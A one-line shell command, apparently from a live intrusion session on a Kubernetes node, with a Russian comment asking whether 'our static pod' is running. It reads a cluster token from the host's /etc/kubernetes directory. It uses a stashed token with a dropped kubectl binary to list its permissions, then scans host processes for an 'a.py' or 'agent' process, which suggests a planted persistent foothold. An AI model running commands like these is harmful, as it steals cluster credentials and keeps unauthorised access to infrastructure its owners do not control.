head -c 14 /host/etc/kubernetes/cxp.token; echo; wc -c /host/etc/kubernetes/cxp.token; /tmp/kubectl --token="$(cat /tmp/.t 2>/dev/null || head -c 400 /dev/null)" auth can-i --list 2>/dev/null | head -3; echo "=== node proc: есть ли наш статик-под? ==="; for pid in $(ls /host/proc | grep -E "^[0-9]+$" | tail -40); do cmd=$(cat /host/proc/$pid/cmdline 2>/dev/null | tr "\0" " " | cut -c1-50); case "$cmd" in *a.py*|*agent*) echo "$pid | $cmd";; esac; done | head -5